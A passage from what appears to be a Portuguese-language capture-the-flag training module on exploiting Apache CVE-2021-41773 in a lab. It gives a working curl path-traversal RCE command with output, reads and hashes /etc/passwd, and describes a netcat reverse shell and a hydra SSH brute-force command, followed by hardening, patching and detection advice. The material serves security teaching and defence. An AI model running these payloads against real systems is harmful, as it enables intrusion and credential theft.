+Um CGI tem que imprimir um cabeçalho antes do conteúdo, senão o Apache reclama.
+Comece o corpo com `echo Content-Type: text/plain; echo;` e só depois ponha o seu
+comando. Algo como:
+`-d 'echo Content-Type: text/plain; echo; id'`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+O servidor executou o seu comando: você tem um foothold. A conta é `daemon` — a
+**primeira parte** da flag. Note que não é root: o serviço roda sem privilégio, o
+que limita (mas não zera) o que você pode fazer.
+</Solution>
+
+### 5.4 Desafio B — saquear o serviço
+
+Agora que você executa comandos, aja como um atacante que acabou de entrar: colete
+informação do sistema. **Seu objetivo:** ler o arquivo `/etc/passwd` (a lista de
+contas do sistema — um dos primeiros alvos de quem ganha acesso) **pelo foothold**,
+e calcular o **SHA-256** do seu conteúdo. Os **12 primeiros caracteres** desse hash
+são a **segunda parte** da flag.
+
+<Hint title="Dica 1">
+Você não precisa mais da traversal para *ler* — você tem execução de comando. Troque
+o `id` por um comando que mostre o arquivo, ou melhor, que já calcule o hash dele no
+próprio alvo: pense em `cat /etc/passwd` e no `sha256sum`.
+</Hint>
+
+<Hint title="Dica 2">
+Mande o alvo calcular o hash e te devolver só ele:
+`-d 'echo Content-Type: text/plain; echo; sha256sum /etc/passwd'`. Pegue os 12
+primeiros caracteres do hash. Confira também, por curiosidade, quantas das contas
+têm shell `nologin` — quase todas, porque são contas de serviço, não de gente.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ curl -sS --path-as-is -d 'echo Content-Type: text/plain; echo; id -un; sha256sum /etc/passwd' \
+    'http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+daemon
+5baf19ce6561538119dfe32d561d6ab8509703606f768fea72723a01ee4264b7  /etc/passwd
+```
+
+Os 12 primeiros caracteres (`5baf19ce6561`) são a segunda parte. Se quiser ver o
+arquivo inteiro, troque o `sha256sum` por `cat`: são 19 contas, 17 delas com
+`/usr/sbin/nologin` — o retrato de uma máquina de serviço. Agora junte as duas
+partes no formato `FLAG{conta-hash}`.
+</Solution>
+
+Monte a flag com a conta do serviço e o início do hash, e valide abaixo.
+
+<FlagInput task="obter-foothold" />
+
+### 5.5 Desligar o laboratório
+
+Terminou? No painel **Laboratório**, clique em **Parar** (libera a vaga do único
+lab ativo). Use **Resetar** se quiser refazer o ataque do zero.
+
+## 6. Variações e aprofundamento
+
+- **Do comando único ao shell interativo.** Executar um `id` por vez é
+  desconfortável. O passo natural (relembre o 2.7) é pedir ao foothold um
+  <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>: você põe um
+  `nc -lvnp 4444` escutando no Kali e faz o comando no corpo disparar uma conexão
+  de volta (por exemplo, com o próprio `/bin/sh` redirecionado para um socket).
+  Assim você troca requisições `curl` soltas por um terminal de verdade na máquina
+  alvo — ainda como `daemon`.
+- **A outra face da mesma CVE: leitura de arquivo.** No nosso alvo o CGI está
+  ligado, então a traversal executa. Se o CGI estivesse **desligado**, a mesma
+  CVE-2021-41773 serviria só para **ler** arquivos (o `/etc/passwd` sairia como
+  texto, sem o 500). É a diferença entre as notas 9.8 e 7.5 que você viu no 5.1 —
+  e o 5.4 explora as duas faces.
+- **Os mesmos três caminhos nos outros serviços.** Num Kali completo (fora deste
+  lab enxuto), você atacaria um FTP anônimo com `ftp` ou `nmap --script ftp-anon`,
+  um SMB com `enum4linux` e `smbclient -N` (null session) ou o módulo do
+  EternalBlue, e um SSH fraco com `hydra -L users.txt -P rockyou.txt ssh://alvo`
+  (brute force) — sempre depois de enumerar. A técnica muda; a esteira
+  enumerar → vetor → foothold, não.
+- **Fazer na ferramenta.** Tudo o que você fez na mão tem um módulo pronto no
+  Metasploit (`exploit/multi/http/apache_normalize_path_rce` para esta CVE). Rodar
+  por lá — e entender o que a ferramenta faz por baixo — é o 5.3.
+
+## 7. Erros comuns
+
+- **"Recebi 500, o alvo não é vulnerável."** Ao contrário: o 500 prova que a
+  traversal chegou ao arquivo. Ele significa "o `/cgi-bin/` tentou **executar** o
+  que alcancei". O caminho é rodar comando (`/bin/sh` + `POST`), não ler.
+- **"Meu payload não faz nada / recebo um 400 ou 404 estranho."** Faltou o
+  `--path-as-is`. Sem ele, o `curl` normaliza o caminho no cliente e apaga a
+  traversal antes de enviar. É o erro nº 1 desta CVE.
+- **"O CGI roda, mas a resposta vem vazia ou com erro 500 de novo."** O corpo
+  precisa imprimir um cabeçalho válido antes do conteúdo. Comece sempre com
+  `echo Content-Type: text/plain; echo;` e só então o comando.
+- **"Errei a quantidade de `../`."** O número de saltos depende de quão fundo está
+  a pasta de origem. Se não alcançou a raiz (`/`), ajuste a quantidade de
+  `%2e%2e/` para mais ou para menos e teste de novo.
+- **"O `curl` não resolve `vulhub`."** Você está rodando fora do Kali. O nome
+  `vulhub` só existe na rede interna do lab; ataque de dentro do Kali.
+- **"Consegui o foothold, mas não leio `/etc/shadow`."** Você é `daemon`, não root.
+  Ler segredos de root exige escalar privilégio — e isso é a Trilha 6.
+
+## 8. Defesa e mitigação
+
+A defesa de serviços se organiza pelos mesmos três vetores. Não há bala de prata;
+há camadas.
+
+**1. Feche as configurações inseguras.** Cada serviço tem as suas:
+
+<CodeBlock
+  title="Endurecendo os serviços (exemplos por família)"
+  lang="bash"
+  code={`# FTP: desligue o acesso anônimo (vsftpd.conf) e prefira SFTP/FTPS
+anonymous_enable=NO
+
+# SSH (sshd_config): sem login de root, sem senha (só chave)
+PermitRootLogin no
+PasswordAuthentication no
+
+# SMB (smb.conf): recuse a null session e desative o SMBv1
+restrict anonymous = 2
+server min protocol = SMB2`}
+/>
+
+**2. Elimine as credenciais fracas.** Senhas fortes e únicas, troca das senhas
+padrão de fábrica, <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>
+onde der, e **limite de tentativas** para estrangular o brute force. O `fail2ban`,
+por exemplo, bane um IP após algumas falhas de login — ele lê os logs do serviço e
+cria regras de firewall sozinho.
+
+**3. Atualize — é o que de fato corrige a versão vulnerável.** Contra a
+CVE-2021-41773, a única correção real é subir para o **Apache 2.4.51 ou mais novo**
+(a 2.4.50 não bastou — veja a CVE-2021-42013 no 5.1). Nenhuma configuração
+substitui o patch.
+
+**4. Reduza o impacto para quando a defesa falhar (defense in depth).** Duas
+medidas mudariam o desfecho do nosso lab, mesmo sem o patch:
+
+<CodeBlock
+  title="httpd.conf — reduzindo a superfície e o estrago"
+  lang="apacheconf"
+  code={`# 1) desligue módulos que você não usa: sem o CGI, a MESMA traversal
+#    viraria leitura de arquivo (grave), não execução de código (pior)
+# (comente as linhas LoadModule do cgid_module e do cgi_module)
+
+# 2) volte ao default seguro: negue o acesso ao sistema de arquivos
+<Directory />
+    Require all denied
+</Directory>`}
+/>
+
+O ponto nº 1 é o que a observação do lab ensina: o serviço rodava como `daemon`,
+uma conta **sem privilégio**. Isso é
+<GlossaryTerm term="least privilege">least privilege</GlossaryTerm> na prática — e
+foi o que impediu que o RCE já fosse, de cara, controle total. Rodar serviços como
+contas restritas (nunca como root) transforma uma catástrofe num problema contido.
+O ponto nº 2 é o <GlossaryTerm term="default deny">default deny</GlossaryTerm>:
+liberar só o necessário, negar o resto.
+
+**5. Detecte o ataque.** Um foothold deixa rastro: no log do Apache aparecem as
+requisições com `%2e` e caminhos estranhos; uma rajada de logins falhos denuncia um
+brute force. Centralize os logs, alerte sobre padrões de ataque e use um
+<GlossaryTerm term="IDS">IDS</GlossaryTerm> (como o Suricata) com regras para as
+CVEs do seu parque. E priorize pelo catálogo <GlossaryTerm term="KEV">KEV</GlossaryTerm>:
+o que já está sendo explorado no mundo (como esta CVE) corrige-se primeiro.
+
+## 9. Exercícios
+
+O desafio principal é o laboratório da seção 5 (a flag `FLAG{conta-hash}`): ganhar
+o foothold e saquear o `/etc/passwd`. Além dele, responda ao quiz — ele cobra o
+*porquê* da mecânica (por que o 500, por que o `--path-as-is`, o que o `daemon`
+significa), não a decoreba dos comandos.
+
+<Quiz task="quiz-final" />
+
+**Exercício prático (opcional).** Com o lab de pé, promova o seu foothold a um
+terminal de verdade: no Kali, deixe `nc -lvnp 4444` escutando num terminal e, em
+outro, faça o corpo do `POST` disparar um reverse shell de volta para `127.0.0.1
+4444` (relembre as formas de reverse shell do 2.7). Quando o `nc` disser
+`connect to ...`, rode `id` e `hostname` na sessão: você está "dentro", ainda como
+`daemon`. Pense: o que você precisaria para virar root? (É a Trilha 6.)
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Atacar um serviço é seguir um de três caminhos até o **acesso inicial**: má
+  configuração, credencial fraca ou versão vulnerável. Cada um se corrige de um
+  jeito diferente — não confunda.
+- FTP (texto claro, anonymous), SSH (chave vs. senha, login de root), SMB (null
+  session, SMBv1) e web (métodos, credenciais padrão, versão) são as famílias que
+  mais aparecem; a esteira enumerar → vetor → foothold vale para todas.
+- No lab, um `500` ao tentar **ler** `/etc/passwd` revelou que o `/cgi-bin/`
+  **executa** o que alcança: a traversal da CVE-2021-41773 vira RCE mandando o
+  comando no corpo para `/bin/sh`. O `--path-as-is` é o que mantém o payload cru.
+- O foothold roda como `daemon`, não root: acesso inicial não é controle total.
+  Rodar o serviço sem privilégio (least privilege) foi o que conteve o estrago.
+- Defesa em camadas: feche configurações, elimine senhas fracas, **atualize** (o
+  único conserto da CVE), reduza superfície (desligue o CGI, default deny) e
+  **detecte** (logs, fail2ban, IDS, KEV).
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) — o boletim primário do EternalBlue/WannaCry.
+- [UK National Audit Office — WannaCry and the NHS](https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/) — o custo real, em números oficiais, de um serviço sem patch.
+- [ESET — Operation Windigo](https://www.welivesecurity.com/2014/03/18/operation-windigo-the-vivisection-of-a-large-linux-server-side-credential-stealing-malware-campaign/) — como um backdoor em SSH mantém 25 mil servidores.
+- [MITRE ATT&CK — T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) e [T1133 External Remote Services](https://attack.mitre.org/techniques/T1133/) — o acesso inicial por serviços, catalogado.
